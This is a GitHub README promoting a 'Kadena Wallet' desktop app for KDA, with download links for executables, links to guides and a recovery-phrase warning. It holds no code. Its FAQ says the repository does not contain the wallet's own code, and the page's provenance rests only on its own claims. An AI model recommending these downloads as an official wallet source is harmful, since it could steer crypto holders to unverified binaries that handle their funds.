![Kadena Wallet](assets/banner-profile.png)

<h1 align="center">Kadena Wallet</h1>

<p align="center">A desktop wallet for KDA that keeps the keys, and the questions, on your side</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/tree/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-BSD_3_CLAUSE-F9BD22?style=for-the-badge&labelColor=0C1322" alt="Licence: BSD-3-Clause" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12"><img src="https://img.shields.io/badge/RELEASE-v--1.3.12-F9BD22?style=for-the-badge&labelColor=0C1322" alt="Release v-1.3.12" /></a></p>

---

## Downloads - v-1.3.12

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-F9BD22?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-F9BD22?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-F9BD22?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12); the values are published there with every build.

> Only download from this GitHub release page.

---
## Why Kadena Wallet

A balance you cannot check is a rumour. Kadena Wallet shows you the chain an account sits on, the amount
on that chain, and the address the amount belongs to, so a zero on screen is something you can test
rather than something you have to believe. The application reads Chainweb directly and signs on your machine, which means the answer to "where is my KDA" is a chain number rather than a support ticket.
The download table below lists each build by platform with the requirement it needs and the exact file
name, so the file you take is the file the published checksums describe.

It is also built for the year the network had. The company that launched Kadena stopped operating in
October 2025, and what replaced it is a community-maintained network with the same twenty chains and the
same accounts. Three things follow from that, and this wallet is designed around them: the tooling has to
work without a vendor, the answers have to be checkable without a help desk, and a backup has to be
provable because nobody is going to restore it for you.

- **Your keys stay yours.** The phrase is generated and used on your machine and is never transmitted.
- **Twenty chains, shown honestly.** A chain selector and a per-chain balance, because a name is separate
  state on each chain.
- **Transfers that finish.** Cross-chain sends complete on both sides instead of leaving a half transfer.
- **Three platforms from one tag.** Windows, macOS and Linux builds published together with checksums.

## Who it is for

- You hold KDA and want a desktop wallet whose keys never leave your machine.
- You need to check what an account actually holds before you decide what to do with it.
- You are working without vendor support and want answers you can reproduce yourself.

This repository is the page for the wallet's chain-data work, and it is one of the places the desktop
application is published from.

## Start here

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What Kadena Wallet Is, and What Self-Custody Actually Means](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/what-is-kadena-wallet-self-custody.md) | Defines what Kadena Wallet is, what self-custody changes about who holds your keys, and which risks stay yours. |
| [Why Your KDA Balance Shows Zero, and Where It Really Is](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/why-kadena-balance-shows-zero-in-wallet.md) | A zero balance has four different causes, and this guide separates a missing price quote from a chain the wallet is not displaying. |
| [How to Create a KDA Account in Kadena Wallet](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/how-to-create-a-kda-account-in-kadena-wallet.md) | The steps that turn a funded key into a named account on a chosen chain, plus the one step that cannot be undone afterwards. |
| [Kadena Wallet Security: A Threat Model You Can Act On](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-security-best-practices.md) | A threat model built from real incidents, ordered by what actually costs people funds rather than by what sounds alarming. |

</div>

**Your recovery phrase is the wallet. Anyone who has it owns the funds, and no support process, page
or tool in this project will ever ask you to type it anywhere.**

---

## Common first questions

### Does this page describe the repository's own code?
No. It is the wallet's page here, and its job is to get you to a build you can verify. Nothing on it explains how that code is structured.

### Where are the checksums?
On the tagged release, beside each of the three files. This page links there rather than repeating the values in a second place.

### Can I use this wallet without this repository?
Yes. The wallet is the application behind the release page; this repository is one of the places its work is published.

## Support

Questions about an account, a chain or a delisted venue are answered in the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md).
A bug in the application belongs on the [issue tracker](https://github.com/kadena-developments/kadena-desktop-wallet/issues).

## License

BSD-3-Clause, the licence this repository itself carries.

---

Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet) - Tagged release: [v-1.3.12](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12) - All guides: [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md)
